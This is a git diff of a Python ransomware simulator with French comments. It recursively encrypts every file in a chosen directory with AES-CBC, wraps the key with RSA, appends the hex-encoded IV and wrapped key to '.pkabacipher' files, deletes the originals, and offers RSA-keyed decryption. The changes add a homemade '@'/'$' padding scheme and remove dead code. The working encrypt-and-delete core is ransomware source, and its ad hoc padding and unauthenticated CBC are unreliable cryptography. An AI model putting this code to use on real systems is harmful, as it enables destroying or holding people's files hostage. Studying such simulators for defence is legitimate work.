@@ -86,6 +86,16 @@ Y                  Y    Y                                       Y    Y
     """
     return random.choice([var1, var2, var3])
 
+# convertir du byte en hexadecimal
+def bytes_to_hex(b):
+    return b.hex()
+
+# convertir de l'hexa en bytes
+def hex_to_bytes(h):
+    return bytes.fromhex(h)
+
+
+
 #############################################################################################################################
 ################################################## Symetric Cryptography ####################################################
 #############################################################################################################################
@@ -96,15 +106,71 @@ def gen_passw():
     return key #password
 
 # Fonction de generation de vecteur d'initialisation
-def gen_init_vertor():
+def gen_init_vector():
     iv = os.urandom(16) # initialization vector
     return iv # initialization_vector
+
+
+# Fonction permettant de savoir si la longueur du message est un multiple de la longueur des blocs (longueur du vecteur d'init (iv) car il est le premier bloc)
+# Cette fonction prend en paramètre le vecteur d'initialisation (iv) et message à chiffrer (data)
+def make_mult_iv(iv, data):
+    if len(data) < len(iv): # On verifie si la longueur du message est inferieur à la longueur du vecteur d'initialisation
+        rest = len(iv) - len(data) # Dans ce cas le nombre de caractère à ajouter pour avoir la multiplicité est égale à la soustraction len(iv) - len(data)
+    else:
+        rest = len(data) % len(iv) # Dans le cas contraire on determine le reste de la division: len(data) % len(iv)
+
+    if rest == 0: # On verifie si la longueur du message est égale à la longueur du vecteur d'initialisation
+        return data # Dans ce cas on retourne le message tel qu'il est
+    else: # Dans le cas contraire
+        # On ajoute un nombre "@" equivalent à la longueur de iv pour permetre de savoir si un ajout à été fait lors du decryptage
+        # (le nombre "@" est equivalent à la longueur de "iv" pour s'assurer que la multiplicité est toujours respecté)
+        # on utilise b"" car on attend des données en bytes
+        delimiteur = b"" # Initialise le delimiteur
+        for k in range(len(iv)):
+            delimiteur = delimiteur + b"@" # on ajoute les caractères
+
+        # Cette boucle permet d'ajouter un nombre de caractère "$" égale à la soustraction entre la longueur de iv et le reste de la division de len(data) par len(iv) toujours dans le but de s'assurer de la multiplicité
+        nbr_lettre_a_ajouter = len(iv) - rest #Nombre de lettre à ajouter
+        reste_letter = b"" # Initialise le reste letter
+        for i in range(nbr_lettre_a_ajouter):
+            reste_letter = reste_letter + b"$" # on ajoute les caractères
+        return data + delimiteur + reste_letter # on retourne un message contenant le message initiale, le delimiteur et des caractères ajoutés pour s'assurer de la multiplicité
+
+
+# Permet de recupérer le message d'origine
+def get_original_data(iv, data):
+    delimiter = b"" # Initialise le delimiteur
+    for i in range(len(iv)):
+        delimiter = delimiter + b"@" # on ajoute les caractères
+
+    a = delimiter.join(data.split(delimiter)[:-1]) # On utilise "delimiter.join(data.split(delimiter)[0])" au lieu "data.split(delimiter)[0]" pour s'assurer que même si un delimiteur existait dans le texte d'origine on le prenne toujours en compte
+    return a # On retourne le message original
+
+"""# Pour le debug
+def ch_test(key_mdp, init_v, data):
+    cipher = Cipher(
+        algorithms.AES(key_mdp),
+        modes.CBC(init_v)
+    )
+    data = make_mult_iv(init_v, data)
+    data_crypte = cipher.encryptor().update(data) + cipher.encryptor().finalize()
+    return data_crypte
+
+def dech_test(key_mdp, init_v, data):
+    cipher = Cipher(
+        algorithms.AES(key_mdp),
+        modes.CBC(init_v)
+    )
+    plaintext_file = cipher.decryptor().update(data) + cipher.decryptor().finalize()
+    data = get_original_data(init_v,plaintext_file)
+    return data
+"""
 
 # Fonction de chiffrement symetrique il prend en paramètre le fichier à chiffrer, la clé publique pour chiffrer de façon assymetrique le password du chiffrement symetrique et le password en question
 def sym_cipher_data(file, public_key, key_mdp):
 
     # vecteur d'initialisation
-    init_v = gen_init_vertor()
+    init_v = gen_init_vector()
 
     # On crée notre chiffreur :)
     cipher = Cipher(
@@ -115,7 +181,7 @@ def sym_cipher_data(file, public_key, key_mdp):
     # On charge notre clé publique pour la rendre utilisable (deserialisation)
     pub_k = load_public_key(public_key)
 
-    # On chiffre assymetriquement le password avec la clé publique
+    # On chiffre asymetriquement le password avec la clé publique
     ciphertext_pass = pub_k.encrypt(
         key_mdp,
         padding.OAEP(
@@ -124,40 +190,22 @@ def sym_cipher_data(file, public_key, key_mdp):
             label=None
         )
     )
-    # On sauvegarde le resultat dans un fichier
-    #with open("password", "wb") as key:
-    #    key.write(ciphertext_pass)
-    #############################################################
-    # Rectification on enregistre plus le mdp chiffré dans un autre fichier mais plus tôt dans le fichier contenant l'information à dechiffrer pour nous permettre de chiffrer/dechiffrer un fichier plusieurs fois
-
-
-    ## On chiffre assimetriquement le vecteur d'initialisation avec la clé publique
-    #ciphertext_iv = pub_k.encrypt(
-    #    key_iv[1],
-    #    padding.OAEP(
-    #        mgf=padding.MGF1(algorithm=hashes.SHA256()),
-    #        algorithm=hashes.SHA256(),
-    #        label=None
-    #    )
-    #)
-    ## On sauvegarde le resultat dans un fichier
-    #with open("init_vector", "wb") as iv:
-    #    iv.write(ciphertext_iv)
-    ###############################################################
 
     # On récupère l'information à chiffrer
     with open(file, "rb") as f:
         data = f.read()
+        data = make_mult_iv(init_v, data) # On verifie la multiplicité entre la longueur du message et celle du vecteur d'initialisation (en retourne un message dont la longueur est multiple de la longueur du iv)
 
-    # On crypte la donné recupérer à l'aide de notre chiffreur
+    # On crypte la donnée recupérée à l'aide de notre chiffreur
     data_crypte = cipher.encryptor().update(data) + cipher.encryptor().finalize()
 
     # on ajoute le vecteur d'initialisation et le mot de passe chiffré au fichier
-    data_and_init_vector = data_crypte + b"pkabacipher" + init_v + b"pkabacipher" + ciphertext_pass
+    # on transforme les bytes en hexadecimale
+    data_and_init_vector = bytes_to_hex(data_crypte) + "pkabacipher" + bytes_to_hex(init_v) + "pkabacipher" + bytes_to_hex(ciphertext_pass)
 
     # On sauvegarde l'information chiffré dans un fichier portant le même nom en y ajoutant l'extention ".pkabacipher"
     new_file = file + ".pkabacipher"
-    with open(new_file, "wb") as nf:
+    with open(new_file, "w") as nf:
         nf.write(data_and_init_vector)
 
     # On suprime l'ancien fichier
@@ -165,34 +213,21 @@ def sym_cipher_data(file, public_key, key_mdp):
 
 # Fonction de dechiffrement symetrique il prend en paramètre le fichier chiffré et la clé privée
 def sym_decipher_data(file_cipher, private_key):
+
     # On charge la clé privée
     priv_k = load_private_key(private_key)
 
-    # On ouvre le fichier chiffrer symetriquement contenant en son sein le vecteur d'initialisation et le mdp chiffré
-    with open(file_cipher, "rb") as f:
+    # On ouvre le fichier chiffré symetriquement contenant en son sein le vecteur d'initialisation et le mdp chiffré
+    with open(file_cipher, "r") as f:
         file_and_init = f.read()
 
 
+    # On recupère chaque partie du fichier chiffré
+    file = hex_to_bytes(file_and_init.split("pkabacipher")[0]) # Le contenu du fichier chiffré
+    plaintext_iv = hex_to_bytes(file_and_init.split("pkabacipher")[1]) # Le vecteur d'initialisation pour dechiffer ce fichier
+    key = hex_to_bytes(file_and_init.split("pkabacipher")[2]) # Le mot de passe pour dechiffrer ce fichier
 
-    # On recupere chaque partie du fichier chiffrer
-    #plaintext_iv = b"".join(file_and_init.split(b"pkabacipher")[-1]) # L evecteur d'initialisation pour ce fichier chiffrer
-    plaintext_iv = file_and_init.split(b"pkabacipher")[1] # L evecteur d'initialisation pour ce fichier chiffrer
-    #file = b"".join(file_and_init.split(b"pkabacipher")[:-1]) # Le contenu du fichier chiffrer
-    file = file_and_init.split(b"pkabacipher")[0] # Le contenu du fichier chiffrer
-    key = file_and_init.split(b"pkabacipher")[2]
-    #print(plaintext_iv)
-    #print(type(plaintext_iv))
-    #print(file)
-    #print(type(file))
-
-
-    ## On déchiffre le mot de passe qui sera utilisé pour le dechiffrement symetrique
-    #with open(key_cipher, "rb") as k:  # On ouvre la clé (mdp symetrique) chiffré asymetriquement par la clé publique
-    #    key = k.read()
-
-    #Plus besoin de recupérer le fichier de mot de passe puis ce qu'il se trouve dans le fichier contenant les infos cryptés
-
-
+    # On dechiffre le mot de passe
     plaintext_key = priv_k.decrypt(
         key,
         padding.OAEP(
@@ -203,18 +238,6 @@ def sym_decipher_data(file_cipher, private_key):
     )
     #######################################################################
 
-    ## On déchiffre le vecteur d'initialisation qui sera utilisé pour le chiffrement symetrique
-    #with open(iv_cipher, "rb") as iv:  # On ouvre le vecteur d'initailisation chiffré asymetriquement par la clé privée
-    #    init_v = iv.read()
-    #plaintext_iv = priv_k.decrypt(
-    #    init_v,
-    #    padding.OAEP(
-    #        mgf=padding.MGF1(algorithm=hashes.SHA256()),
-    #        algorithm=hashes.SHA256(),
-    #        label=None
-    #    )
-    #)
-    #############################################################################
 
     # On crèe notre dechiffreur
     cipher = Cipher(
@@ -224,6 +247,9 @@ def sym_decipher_data(file_cipher, private_key):
 
     # On decrypte les données récupérés à l'aide de notre dechiffreur (:
     plaintext_file = cipher.decryptor().update(file)+cipher.decryptor().finalize()
+
+    #On recupère le message original
+    plaintext_file = get_original_data(plaintext_iv, plaintext_file)
 
     # On sauvegarde l'information dechiffré dans un fichier portant le nom initial i.e en supprimant l'extention ".pkabacipher"
     new_file = ".".join(str(file_cipher).split(".")[:-1])
@@ -298,7 +324,7 @@ def load_public_key(public_key_file):
         )
     return public_key
 
-# Fonction de chiffrement asymetrique prenant en paramètre la clé publique et le fichier à chiffrer
+# Fonction de chiffrement asymetrique prenant en paramètre la clé publique et le fichier à chiffrer (Fonction non utilisé)
 def ch(public_key, file):
     with open(file, "rb") as f:
         message = f.read()
@@ -315,7 +341,7 @@ def ch(public_key, file):
         nf.write(ciphertext)
     os.remove(file)
 
-# Fonction de dechiffrement asymetrique prenant en paramètre la clé privée et le fichier à dechiffrer
+# Fonction de dechiffrement asymetrique prenant en paramètre la clé privée et le fichier à dechiffrer (Fonction non utilisé)
 def dech(private_key, file):
     with open(file, "rb") as f:
         ciphertext = f.read()
@@ -337,24 +363,23 @@ def dech(private_key, file):
 #############################################################################################################################
 
 def crypter(dir, public_key_file, mdp):
-    if os.path.isdir(dir):
-        for (current_dir, list_dir, files) in os.walk(dir):
+    if os.path.isdir(dir): # Le dossier exist-il ?
+        for (current_dir, list_dir, files) in os.walk(dir): # Si OUI on liste les dossiers et fichiers contenus dans le dossier courant
             for f in files:
                 path_file = current_dir + "/" + f
-                print(path_file)
+                print(path_file) # On affiche les fichiers
         print("\nLes fichiers Listés seront crypté voulez vous continuer ?")
-        continuer = str(input("O/N >> "))
-        if continuer.lower() == "o":
+        continuer = str(input("O/N >> ")) # Demande pour continuer
+        if continuer.lower() == "o": # Si oui
             print("\nDebut du chiffrement...\n")
-            for (current_dir, list_dir, files) in os.walk(dir):
+            for (current_dir, list_dir, files) in os.walk(dir): # On liste les dossiers et fichiers contenus dans le dossier courant
                 for f in files:
                     path_file = current_dir + "/" + f
                     print_blue("Ancien = {}".format(path_file))
                     try:
-                        sym_cipher_data(path_file, public_key_file, mdp)
+                        sym_cipher_data(path_file, public_key_file, mdp) # On chiffre les fichiers
                         path_file_c = path_file + ".pkabacipher"
                         print_green("Nouveau = {}".format(path_file_c))
-                        #ch(public_key, path_file)
                     except Exception as e:
                         print(e)
             print("\nFin du chiffrement...")
@@ -364,23 +389,21 @@ def crypter(dir, public_key_file, mdp):
         print("\nDésolé vous avez entrez un dossier inexistant :(")
 
 def decrypter(dir, private_key_file):#, mdp):
-    if os.path.isdir(dir):
-        for (current_dir, list_dir, files) in os.walk(dir):
+    if os.path.isdir(dir): # Le dossier exist-il ?
+        for (current_dir, list_dir, files) in os.walk(dir): # Si OUI on liste les dossiers et fichiers contenus dans le dossier courant
             for f in files:
                 path_file = current_dir + "/" + f
-                print(path_file)
+                print(path_file) # On affiche les fichiers
         print("\nLes fichiers Listés seront decrypté (assurez vous d'avoir l'extention \".pkabacipher\" avant de les dechiffrer. voulez vous continuer ?")
-        continuer = str(input("O/N >> "))
-        if continuer.lower() == "o":
+        continuer = str(input("O/N >> ")) # Demande pour continuer
+        if continuer.lower() == "o": # Si OUI
             print("\nDebut du dechiffrement...\n")
-            for (current_dir, list_dir, files) in os.walk(dir):
+            for (current_dir, list_dir, files) in os.walk(dir): # On liste les dossiers et fichiers contenus dans le dossier courant
                 for f in files:
                     path_file = current_dir + "/" + f
                     print_blue("Ancien = {}".format(path_file))
                     try:
-                        #dech(private_key, path_file)
-                        #sym_decipher_data(path_file, mdp, private_key_file)
-                        sym_decipher_data(path_file, private_key_file)
+                        sym_decipher_data(path_file, private_key_file) # On dechiffre les fichiers
                         path_file_c = ".".join(str(path_file).split(".")[:-1])
                         print_green("Nouveau = {}".format(path_file_c))
                     except Exception as e:
@@ -390,18 +413,6 @@ def decrypter(dir, private_key_file):#, mdp):
             print("\nDechiffrement annulé...")
     else:
         print("\nDésolé vous avez entrez un dossier inexistant :(")
-
-def main():
-    choix = "1"
-    while choix != "q":
-        choix= input("1:crypter, 2:decrypter > ")
-        if choix == "1":
-            mdp = gen_passw() # On genere notre password
-            crypter("/hojjhme", "public_key", mdp)
-        elif choix == "2":
-            decrypter("private_key")
-
-#main()
 
 
 parser = argparse.ArgumentParser(description="Systeme de chiffrement/dechiffrement de fichier simulant un ransonware")
@@ -448,6 +459,4 @@ elif args.command == 'enc':
 elif args.command == 'dec':
     dir = args.dir
     priv_key = args.priv_key
-    #mdp = args.mdp
-    decrypter(dir,priv_key)#,mdp)
-    #print('dir= ', args.dir , "priv_key= ", args.priv_key )
+    decrypter(dir,priv_key)
